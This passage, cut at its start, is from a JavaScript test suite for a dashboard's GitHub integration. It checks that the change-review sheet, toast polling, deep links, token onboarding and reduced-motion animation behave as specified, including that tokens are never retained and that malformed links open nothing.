    w.__click(sheet(w).querySelector('button[data-ghr="push_pr"]')); await w.__tick(4);
    T.check("pushing: the button says so", /Pushing…/.test(txt(sheet(w))));
    w.__key(w.document.activeElement, "Escape");
    T.check("Esc closes the sheet while the push is in flight", sheet(w).hidden === true && G(w).state.review.open === false);
    const n0 = w.__toasts.length;
    hold.resolve(); await w.__tick(16);
    T.check("the late answer does NOT put the sheet back on screen", sheet(w).hidden === true);
    T.check("...so Esc and the focus trap are never left off a visible sheet", !(sheet(w).hidden === false && G(w).state.review.open === false));
    T.check("...it is said in a toast instead", w.__toasts.length === n0 + 1 &&
      /^GitHub change: Pushed, and opened draft pull request #12\./.test(w.__toasts[n0][0]), w.__toasts.slice(n0));
    T.check("...the decision was sent once, and the card's list was refreshed",
      bodies(w, "/api/github/changes/decide").length === 1 &&
      calls(w, "/api/github/changes").some(function (f) { return f.url === "/api/github/changes"; }));
    T.check("closing again is harmless", (G(w).closeReview(), sheet(w).hidden === true));

    // ---- a refusal that arrives after Esc is said too (the owner must know nothing happened)
    const holdB = deferred();
    const wb = await page({ routes: { "/api/github/status": statusOff(),
      "/api/github/changes": function (url) { return url.indexOf("?id=") > 0 ? { ok: true, change: change(ID1) } : { ok: true, changes: [] }; },
      "/api/github/changes/decide": function () {
        return holdB.p.then(function () { return { __status: 403, body: { ok: false, error: "owner_only" } }; });
      } } });
    await G(wb).openReview(ID1); await wb.__tick(10);
    Array.from(sheet(wb).querySelectorAll("input[data-ack]")).forEach(function (x) { change_(x, true); });
    change_(sheet(wb).querySelector("input[data-confirm-public]"), true);
    wb.__click(sheet(wb).querySelector('button[data-ghr="push_pr"]')); await wb.__tick(4);
    wb.__key(wb.document.activeElement, "Escape");
    const nb = wb.__toasts.length;
    holdB.resolve(); await wb.__tick(14);
    T.check("a refusal after Esc: no sheet, one toast with the reason", sheet(wb).hidden === true && wb.__toasts.length === nb + 1 &&
      /from the Hermes window itself/.test(wb.__toasts[nb][0]));

    // ---- Retract: the same
    const holdC = deferred();
    let pushed = pushedChange();
    const wc = await page({ routes: { "/api/github/status": statusOff(),
      "/api/github/changes": function (url) { return url.indexOf("?id=") > 0 ? { ok: true, change: pushed } : { ok: true, changes: [] }; },
      "/api/github/changes/retract": function () {
        return holdC.p.then(function () {
          pushed = change(ID1, { state: "retracted", retracted_at: NOW, digest: "9".repeat(64) });
          return { ok: true, state: "retracted", pr_closed: true, change: summary(ID1, { state: "retracted" }) };
        });
      } } });
    await G(wc).openReview(ID1); await wc.__tick(10);
    wc.__confirm = true;
    wc.__click(sheet(wc).querySelector('button[data-ghr="retract"]')); await wc.__tick(4);
    wc.__key(wc.document.activeElement, "Escape");
    const nc = wc.__toasts.length;
    holdC.resolve(); await wc.__tick(14);
    T.check("a late Retract answer: no sheet, a toast that says the branch is gone", sheet(wc).hidden === true &&
      wc.__toasts.length === nc + 1 && /^GitHub change: Retracted\. The branch is gone from GitHub and the pull request is closed\./.test(wc.__toasts[nc][0]),
      wc.__toasts.slice(nc));
    // ---- another change opened over a push in flight: the answer is still reported
    const holdD = deferred();
    const wd = await page({ routes: { "/api/github/status": statusOff(),
      "/api/github/changes": function (url) {
        if (url.indexOf("?id=") > 0) return { ok: true, change: change(url.split("?id=")[1]) };
        return { ok: true, changes: [] };
      },
      "/api/github/changes/decide": function () {
        return holdD.p.then(function () {
          return { ok: true, state: "pushed", pushed_sha: "f".repeat(40), notified: true, pr: null, change: summary(ID1, { state: "pushed" }) };
        });
      } } });
    await G(wd).openReview(ID1); await wd.__tick(10);
    Array.from(sheet(wd).querySelectorAll("input[data-ack]")).forEach(function (x) { change_(x, true); });
    change_(sheet(wd).querySelector("input[data-confirm-public]"), true);
    wd.__click(sheet(wd).querySelector('button[data-ghr="push_only"]')); await wd.__tick(4);
    await G(wd).openReview(ID2); await wd.__tick(10);
    const nd = wd.__toasts.length;
    holdD.resolve(); await wd.__tick(14);
    T.check("a push answered while ANOTHER change is open: said inside that sheet (the toast would sit under it)",
      wd.__toasts.length === nd && G(wd).state.review.id === ID2 && !sheet(wd).hidden &&
      /Earlier decision on octo-owner\/pub hermes\/fix-copy: Pushed\. No pull request was opened\./.test(txt(sheet(wd))),
      txt(sheet(wd)).slice(-300));
    T.check("...and that review keeps its own state (nothing ticked, still pending)",
      sheet(wd).querySelectorAll("input[data-ack][checked]").length === 0 && !!sheet(wd).querySelector('button[data-ghr="push_pr"]'));
  });

  await scenario("review sheet: typed PR text survives Esc, ticks do not", async function () {
    let ch = change(ID1);
    const w = await page({ routes: { "/api/github/status": statusOff(),
      "/api/github/changes": function (url) { return url.indexOf("?id=") > 0 ? { ok: true, change: ch } : { ok: true, changes: [] }; } } });
    await G(w).openReview(ID1); await w.__tick(10);
    let s = sheet(w);
    T.check("nothing typed: no draft message", !/earlier edits/.test(txt(s)));
    input_(s.querySelector("input[data-ghr-title]"), "My better title");
    input_(s.querySelector("textarea[data-ghr-body]"), "My longer\ndescription");
    change_(s.querySelector("input[data-ack]"), true);
    w.__key(w.document.activeElement, "Escape");
    await G(w).openReview(ID1); await w.__tick(10);
    s = sheet(w);
    T.check("reopened: the typed title and description are back", s.querySelector("input[data-ghr-title]").value === "My better title" &&
      s.querySelector("textarea[data-ghr-body]").value === "My longer\ndescription");
    T.check("...and it says so, and that the ticks start again", /Your earlier edits to the title or description are back\. Every warning needs its tick again/.test(txt(s)));
    T.check("...no tick is restored", s.querySelectorAll("input[data-ack][checked]").length === 0 &&
      s.querySelector('button[data-ghr="push_pr"]').disabled);
    T.check("the footer preview follows the restored description", /^…your description/.test(txt(s.querySelector("[data-ghr-footer]"))));
    // restored text is what a decision sends (as an edit)
    Array.from(s.querySelectorAll("input[data-ack]")).forEach(function (x) { change_(x, true); });
    change_(s.querySelector("input[data-confirm-public]"), true);
    T.check("...and it counts as an edit in the decide body", (function () {
      const b = G(w).decideBody(ch, G(w).state.review, "push_pr");
      return b.title === "My better title" && b.body === "My longer\ndescription";
    })());
    // put the original text back by hand: the draft is dropped
    input_(s.querySelector("input[data-ghr-title]"), ch.title);
    input_(s.querySelector("textarea[data-ghr-body]"), ch.body);
    w.__key(w.document.activeElement, "Escape");
    T.check("text put back by hand leaves no draft", G(w).state.drafts[ID1] === undefined);
    // a draft for CONTENT that changed meanwhile (new digest) is not put back
    await G(w).openReview(ID1); await w.__tick(10);
    input_(sheet(w).querySelector("input[data-ghr-title]"), "Stale draft");
    w.__key(w.document.activeElement, "Escape");
    ch = change(ID1, { digest: "7".repeat(64), title: "New content" });
    await G(w).openReview(ID1); await w.__tick(10);
    T.check("a changed digest: the new content wins, no stale text", sheet(w).querySelector("input[data-ghr-title]").value === "New content" &&
      !/earlier edits/.test(txt(sheet(w))));
    // opening ANOTHER change over this one keeps the first one's typed text as well
    const wq = await page({ routes: { "/api/github/status": statusOff(),
      "/api/github/changes": function (url) { return url.indexOf("?id=") > 0 ? { ok: true, change: change(url.split("?id=")[1], { title: "Title of " + url.split("?id=")[1] }) } : { ok: true, changes: [] }; } } });
    await G(wq).openReview(ID1); await wq.__tick(10);
    input_(sheet(wq).querySelector("input[data-ghr-title]"), "Typed over A");
    await G(wq).openReview(ID2); await wq.__tick(10);
    T.check("a second change opened over the first shows its own title", sheet(wq).querySelector("input[data-ghr-title]").value === "Title of " + ID2);
    wq.__key(wq.document.activeElement, "Escape");
    await G(wq).openReview(ID1); await wq.__tick(10);
    T.check("...and the first one's typed title was kept", sheet(wq).querySelector("input[data-ghr-title]").value === "Typed over A");
  });

  // =========================================================================
  await scenario("toast poll + deep link", async function () {
    let pending = [ID1];
    const st = function () { return statusOn({ pending: pending.length, drift: [], attention: [] }); };
    const w = await page({ routes: {
      "/api/github/status": function () { return st(); },
      "/api/github/changes": function (url) {
        if (url.indexOf("?id=") > 0) { const id = url.split("?id=")[1]; return { ok: true, change: change(id) }; }
        return { ok: true, pending: pending.length, changes: pending.map(function (id) { return summary(id); }) };
      } } });
    T.check("connected at boot: the existing pending id is seeded, not toasted", w.__toasts.length === 0 && G(w).state.seen[ID1] === 1);
    const iv = w.__intervals.filter(function (i) { return i.ms === 60000; });
    T.check("one 60 s poll timer", iv.length === 1);
    const n0 = w.__fetches.length;
    T.check("a poll right after the last read does nothing (at most every 60 s)",
      (await G(w).poll(false)) === false && w.__fetches.length === n0);
    G(w).state.lastPollAt = Date.now() - 61000;
    w.document.hidden = true; w.document.visibilityState = "hidden";
    T.check("hidden: no poll, no request", (await G(w).poll(false)) === false && w.__fetches.length === n0);
    w.document.hidden = false; w.document.visibilityState = "visible";
    T.check("visible, 60 s later, same ids: polls, no toast", (await G(w).poll(false)) === true && w.__toasts.length === 0 &&
      calls(w, "/api/github/status").pop().url === "/api/github/status?scan=0");
    pending = [ID1, ID2];
    G(w).state.lastPollAt = Date.now() - 61000;
    await G(w).poll(false); await w.__tick(6);
    T.check("a NEW pending id raises exactly one toast", w.__toasts.length === 1 && w.__toasts[0][0] === "Hermes has a GitHub change for you");
    const toastEl = w.document.getElementById("toast");
    T.check("...which takes a click while it is up", toastEl.style.pointerEvents === "auto" && typeof toastEl.onclick === "function");
    G(w).state.lastPollAt = Date.now() - 61000;
    await G(w).poll(false);
    T.check("the same id never toasts twice", w.__toasts.length === 1);
    w.__click(toastEl); await w.__tick(10);
    T.check("clicking the toast opens that change's review", !!sheet(w) && !sheet(w).hidden &&
      calls(w, "/api/github/changes").some(function (f) { return f.url === "/api/github/changes?id=" + ID2; }));
    // a new id that is the one already open: no toast
    pending = [ID1, ID2, ID3];
    await G(w).openReview(ID3); await w.__tick(6);
    G(w).state.lastPollAt = Date.now() - 61000;
    await G(w).poll(false);
    T.check("a change opened in the sheet does not toast", w.__toasts.length === 1);
    G(w).closeReview();
    // the poll timer fires the poll
    G(w).state.lastPollAt = Date.now() - 61000;
    const before = calls(w, "/api/github/status").length;
    iv[0].fn(); await w.__tick(8);
    T.check("the interval runs the same poll", calls(w, "/api/github/status").length === before + 1);
    // disconnected elsewhere -> the poll stops
    w.__routes["/api/github/status"] = statusOff();
    G(w).state.lastPollAt = Date.now() - 61000;
    await G(w).poll(false);
    T.check("a status that says not connected stops the poll", !w.__intervals.some(function (i) { return i.ms === 60000; }));
    T.check("not connected: poll() makes no request", (await G(w).poll(true)) === false);
    T.check("no toast through all of it was ever on page load", w.__toasts.length === 1);

    // deep link
    const w2 = await page({ hash: "#github-review=" + ID1, routes: { "/api/github/status": statusOff(),
      "/api/github/changes": function () { return { ok: true, change: change(ID1) }; } } });
    T.check("#github-review=<id> on load opens the review", !!sheet(w2) && !sheet(w2).hidden &&
      calls(w2, "/api/github/changes")[0].url === "/api/github/changes?id=" + ID1);
    G(w2).closeReview();
    T.check("closing consumes the deep link (history.replaceState, no reload loop)", w2.__replaced.length === 1 && w2.location.hash === "");
    w2.location.hash = "#github-review=" + ID2;
    w2.dispatchEvent(new Event("hashchange")); await w2.__tick(10);
    T.check("hashchange opens it too", !sheet(w2).hidden && calls(w2, "/api/github/changes").some(function (f) { return f.url === "/api/github/changes?id=" + ID2; }));
    G(w2).closeReview();
    const n2 = calls(w2, "/api/github/changes").length;
    for (const bad of ["#github-review=../../x", "#github-review=ghc-XYZ", "#github-review=" + ID1 + "&x", "#settings/connections"]) {
      w2.location.hash = bad;
      w2.dispatchEvent(new Event("hashchange")); await w2.__tick(4);
    }
    T.check("a malformed or foreign hash opens nothing", calls(w2, "/api/github/changes").length === n2 && sheet(w2).hidden);
  });

  // =========================================================================
  await scenario("onboarding step: registration through the hook", async function () {
    // (1) this file loads BEFORE the onboarding module
    const w = await page();
    const arr = w.hermesOnboardingSteps;
    T.check("loaded first: pushes onto window.hermesOnboardingSteps (created)", Array.isArray(arr) && arr.length === 1 && arr[0].key === "github");
    // the onboarding module (stub, per contract 1) keeps the SAME array
    w.__run("(function(){ var a = window.hermesOnboardingSteps || (window.hermesOnboardingSteps = []);" +
      " window.__seenByOnb = a.map(function(e){ return e.key; }); })()", "onb-stub.js");
    T.check("...the onboarding module sees it", JSON.stringify(w.__seenByOnb) === JSON.stringify(["github"]));
    const e = arr[0];
    T.check("entry: key/eyebrow/title/sub exactly §1.3", /^[a-z][a-z0-9_-]{1,23}$/.test(e.key) &&
      e.eyebrow === "Optional · GitHub" && e.title === "Let Hermes propose code changes on GitHub" &&
      e.sub === "Nothing is pushed until you approve it here, and never to your main branch.");
    T.check("entry: after prefs, optional, every hook function", e.after === "prefs" && e.optional === true &&
      ["render", "wire", "save", "statusRow", "summary"].every(function (k) { return typeof e[k] === "function"; }));
    // (2) loaded AFTER: registerStep is used
    const w2 = await page({ before: function (x) {
      x.__run("window.__reg = []; window.hermesOnboardingSteps = [{key:'github', title:'old'}, {key:'other', title:'x'}];" +
        " window.hermesOnboarding = { registerStep: function (en) { __reg.push(en); } };", "onb-first.js");
    } });
    T.check("loaded second: hermesOnboarding.registerStep(entry) is called once", w2.__reg.length === 1 && w2.__reg[0].key === "github");
    T.check("...and the array is left to the hook", w2.hermesOnboardingSteps.length === 2 && w2.hermesOnboardingSteps[0].title === "old");
    // (3) an older entry with the same key in the array (no hook yet): replaced
    const w3 = await page({ before: function (x) {
      x.__run("window.hermesOnboardingSteps = [{key:'github', title:'old'}, {key:'other', title:'x'}];", "pre.js");
    } });
    T.check("same key already in the array: replaced, not duplicated", w3.hermesOnboardingSteps.length === 2 &&
      w3.hermesOnboardingSteps[0].title === "Let Hermes propose code changes on GitHub" && w3.hermesOnboardingSteps[1].key === "other");
  });

  await scenario("onboarding step: render / wire / skip / save / summary / statusRow", async function () {
    const okPayload = statusOn({ stored: true, checks_passed: { contents_write: "verified", pull_requests: "ok" }, drift: [], attention: [] });
    // the boot read fails, so the step starts with no status of its own
    const w = await page({ routes: { "/api/github/status": { __status: 503, body: { ok: false } }, "/api/github/connect": okPayload,
      "/api/github/ambient": { ok: true, ambient: AMBIENT }, "/api/github/changes": { ok: true, changes: [] } } });
    const e = w.hermesOnboardingSteps[0];
    T.check("statusRow before any read: a neutral, true line", JSON.stringify(e.statusRow({})) ===
      JSON.stringify(["", "GitHub", "Optional. Connect it in Settings › Connections whenever you like."]));
    w.__routes["/api/github/status"] = statusOff();
    let reps = 0;
    const ctx = { rerun: false, data: { ok: true }, repaint: function () { reps++; }, setErr: function () {} };
    const node = w.document.querySelector("#onb-sheet .onb-body");
    const fetches0 = w.__fetches.length;
    node.innerHTML = e.render(ctx);
    e.wire(node, ctx); await w.__tick(10);
    const t = txt(node);
    const C = G(w).COPY;
    T.check("render: both paragraphs and the numbered list", t.indexOf(C.p1) >= 0 && t.indexOf(C.p2) >= 0 &&
      node.querySelectorAll("ol.ghc-steps li").length === 3);
    T.check("render: the three buttons", /Open GitHub to create the token/.test(t) && /Check token/.test(t) &&
      txt(node.querySelector('button[data-gh="skip"]')).trim() === "Skip — connect later in Settings › Connections");
    T.check("render: field label, placeholder, helper", !!node.querySelector("#ghstep-token") &&
      node.querySelector("#ghstep-token").getAttribute("placeholder") === "github_pat_…" && /Never shown again/.test(t));
    T.check("render does not repeat the title (the sheet shows eyebrow/title/sub)", t.indexOf(e.title) < 0);
    const after = w.__fetches.slice(fetches0).map(function (f) { return f.url; });
    T.check("wire: its own status read and NOTHING else (no network until Check token)",
      JSON.stringify(after) === JSON.stringify(["/api/github/status?scan=0"]), after);
    T.check("wire never repaints the whole sheet from a fetch", reps === 0);
    T.check("statusRow after the read: not connected", e.statusRow({})[2].indexOf("Not connected.") === 0);
    // Skip advances through the sheet's own primary button
    let goClicks = 0;
    w.document.querySelector("#onb-sheet .onb-go").onclick = function () { goClicks++; };
    w.__click(node.querySelector('button[data-gh="skip"]'));
    T.check("Skip advances (the sheet's Continue)", goClicks === 1);
    // with the real hook the footer has its own Skip (which never calls save()): preferred
    const foot = w.document.createElement("div"); foot.className = "onb-foot";
    const skBtn = w.document.createElement("button"); skBtn.setAttribute("data-act", "skip");
    let skClicks = 0; skBtn.onclick = function () { skClicks++; };
    foot.appendChild(skBtn); w.document.getElementById("onb-sheet").appendChild(foot);
    w.__click(node.querySelector('button[data-gh="skip"]'));
    T.check("Skip uses the hook's own footer Skip when it is there (not Continue)", skClicks === 1 && goClicks === 1);
    T.check("save() after Skip resolves {}", JSON.stringify(await e.save(ctx)) === "{}");
    T.check("summary after Skip: not connected, later in Settings", /^GitHub: not connected\. You can connect it any time/.test(e.summary(ctx)[0]));
    // a pasted, unchecked token at save: cleared, never kept
    node.querySelector("#ghstep-token").value = TOKEN;
    T.check("save() with an unchecked token resolves {}", JSON.stringify(await e.save(ctx)) === "{}");
    T.check("...the field is emptied, the token sent nowhere", node.querySelector("#ghstep-token").value === "" &&
      calls(w, "/api/github/connect").length === 0 && everything(w).indexOf(TOKEN) < 0);
    T.check("...and the Ready summary says so", /was not checked, and Hermes did not keep it/.test(e.summary(ctx)[0]));
    // Check token in the step
    node.querySelector("#ghstep-token").value = TOKEN;
    w.__click(node.querySelector('button[data-gh="check"]')); await w.__tick(14);
    T.check("Check token in the step: the same POST", bodies(w, "/api/github/connect").length === 1 &&
      bodies(w, "/api/github/connect")[0].token === TOKEN);
    T.check("...the success panel replaces the form in place", /Connected as @octo-owner\./.test(txt(node)) &&
      !node.querySelector("input[data-gh-token]"));
    T.check("...with other GitHub access read locally", /GitHub CLI/.test(txt(node)));
    T.check("save() -> {applied:['GitHub connected as @login']}", JSON.stringify(await e.save(ctx)) ===
      JSON.stringify({ applied: ["GitHub connected as @octo-owner"] }));
    // the same line as applied (the sheet drops the duplicate after Continue);
    // the footer's Skip never calls save(), so summary() must carry it too
    T.check("summary repeats the connected line (Skip never calls save())",
      JSON.stringify(e.summary(ctx)) === JSON.stringify(["GitHub connected as @octo-owner"]), e.summary(ctx));
    T.check("statusRow: connected", JSON.stringify(e.statusRow({}).slice(0, 2)) === JSON.stringify(["ok", "GitHub"]) &&
      /Connected as @octo-owner/.test(e.statusRow({})[2]));
    T.check("the token is nowhere after the step", everything(w).indexOf(TOKEN) < 0);
    T.check("no data-act in the step markup (the sheet's own namespace)", !/data-act=/.test(html(node)));

    // already connected before the sheet opened
    const w2 = await page({ routes: { "/api/github/status": statusOn() } });
    const e2 = w2.hermesOnboardingSteps[0];
    const n2 = w2.document.querySelector("#onb-sheet .onb-body");
    n2.innerHTML = e2.render(ctx); e2.wire(n2, ctx); await w2.__tick(10);
    T.check("already connected: the step says so and offers no form", /already connected as @octo-owner/.test(txt(n2)) &&
      !n2.querySelector("input[data-gh-token]"));
    T.check("...summary: unchanged", /already connected as @octo-owner — unchanged/.test(e2.summary(ctx)[0]));
    T.check("...save() resolves {}", JSON.stringify(await e2.save(ctx)) === "{}");
  });

  // =========================================================================
  await scenario("motion: only through HermesAnim; instant when reduced", async function () {
    let L = null;
    const w = await page({ routes: { "/api/github/status": statusOn({ pending: 1, drift: [], attention: [] }),
      "/api/github/changes": function (url) { return url.indexOf("?id=") > 0 ? { ok: true, change: change(ID1) } :
        { ok: true, changes: [summary(ID2)] }; }, "/api/github/ambient": { ok: true, ambient: AMBIENT }, "/api/access": { dirs: [] } },
      before: function (x) { L = AS.install(x, {}); x.__run(ANIM, "aux_anim.js"); } });
    await mountCard(w);
    const m0 = L.of("motion", "animate").length;
    G(w).paintCard(false);
    G(w).state.lastPollAt = Date.now() - 61000;
    await G(w).poll(false); await w.__tick(8);
    T.check("a card repaint and a poll animate nothing", L.of("motion", "animate").length === m0);
    await G(w).openReview(ID1); await w.__tick(10);
    const s = sheet(w);
    const opens = L.of("motion", "animate").filter(function (c) { return c.el === s; });
    T.check("opening the sheet is one HermesAnim enter on the sheet (opacity only)", opens.length === 1 &&
      Object.keys(opens[0].kf).join() === "opacity");
    L.finishAll();
    G(w).closeReview();
    const exits = L.of("motion", "animate").filter(function (c) { return c.el === s; });
    T.check("closing is an exit on the sheet (opacity only)", exits.length === 2 && Object.keys(exits[1].kf).join() === "opacity");
    T.check("...the sheet hides only when the exit ends", s.hidden === false);
    L.finishAll(); await w.__tick(4);
    T.check("...then it is hidden", s.hidden === true);
    T.check("nothing in <header> was animated", !L.of("motion", "animate").some(function (c) { return c.el.closest && c.el.closest("header"); }));
    // reopen during the exit: the sheet stays open
    await G(w).openReview(ID1); await w.__tick(8);
    G(w).closeReview();
    await G(w).openReview(ID1); await w.__tick(8);
    L.finishAll(); await w.__tick(4);
    T.check("reopening during the exit keeps the sheet open (the exit's done never hides it)", sheet(w).hidden === false);

    // reduced motion (the in-app switch): instant
    let L2 = null;
    const w2 = await page({ routes: { "/api/github/status": statusOff(), "/api/github/changes": { ok: true, change: change(ID1) } },
      before: function (x) { x.document.documentElement.setAttribute("data-reduce", "1"); L2 = AS.install(x, {}); x.__run(ANIM, "aux_anim.js"); } });
    await G(w2).openReview(ID1); await w2.__tick(10);
    G(w2).closeReview();
    T.check("reduced: no animation at all, the sheet hides at once", L2.of("motion", "animate").length === 0 && sheet(w2).hidden === true);
    // OS reduced motion
    let L3 = null;
    const w3 = await page({ media: function (q) { return /prefers-reduced-motion/.test(q); },
      routes: { "/api/github/status": statusOff(), "/api/github/changes": { ok: true, change: change(ID1) } },
      before: function (x) { L3 = AS.install(x, {}); x.__run(ANIM, "aux_anim.js"); } });
    await G(w3).openReview(ID1); await w3.__tick(10);
    G(w3).closeReview();
    T.check("OS reduced motion: instant too", L3.of("motion", "animate").length === 0 && sheet(w3).hidden === true);
  });

  // =========================================================================
  await scenario("on the real index.html with the real Settings shell", async function () {
    // browser named access makes #toast shadow index.html's toast() in the
    // mini DOM (a browser lets the function win): t_anim_hub's workaround
    const w = await bootDashboard({ aux: ["aux_settings_shell.js", "aux_github.js"],
      before: function (w0) { delete w0.toast; }, routes: {
      "/api/github/status": statusOn({ pending: 1, drift: [], attention: [] }),
      "/api/github/ambient": { ok: true, ambient: AMBIENT }, "/api/access": { dirs: [] },
      "/api/github/changes": function (url) {
        if (url.indexOf("?id=") > 0) return { ok: true, change: change(url.split("?id=")[1]) };
        return { ok: true, pending: 1, changes: [summary(ID1)] };
      } } });
    const d = w.document;
    w.__run("setView('mind')");
    await w.__run("mindExtras()"); await w.__tick(14);
    const c = d.getElementById("mind-extra-github");
    T.check("mounted in the real Settings › Connections panel", !!c && !!c.closest("#sec-connections"));
    T.check("...not left directly under #view-mind", c && c.parentNode.id !== "view-mind");
    T.check("index.html's esc() and HA() are what it uses (no page error)", w.__errors.filter(function (e) {
      return /aux_github/.test(String(e && e.stack)); }).length === 0, w.__errors.map(String).slice(0, 3));
    // a new change -> index.html's real toast(), and a click opens the review
    w.__routes["/api/github/changes"] = function (url) {
      if (url.indexOf("?id=") > 0) return { ok: true, change: change(url.split("?id=")[1]) };
      return { ok: true, pending: 2, changes: [summary(ID1), summary(ID2)] };
    };
    w.__routes["/api/github/status"] = statusOn({ pending: 2, drift: [], attention: [] });
    w.hermesGitHub.state.lastPollAt = Date.now() - 61000;
    await w.hermesGitHub.poll(false); await w.__tick(8);
    const t = d.getElementById("toast");
    T.check("the real toast() shows 'Hermes has a GitHub change for you'", t.textContent === "Hermes has a GitHub change for you" &&
      t.classList.contains("on"));
    w.__click(t); await w.__tick(12);
    const s = d.getElementById("gh-review");
    T.check("clicking it opens the review sheet over the page", !!s && !s.hidden && /Fix/.test(s.textContent));
    w.__key(d.activeElement, "Escape"); await w.__tick(4);
    T.check("Esc closes it (the page's own Esc handler stays out of it)", s.hidden === true);
    const opened = await w.hermesGitHub.openCard();
    T.check("openCard() shows Settings › Connections with the card", opened === true && !d.getElementById("view-mind").hidden &&
      !d.getElementById("sec-connections").hidden);
  });

  T.done();
})();
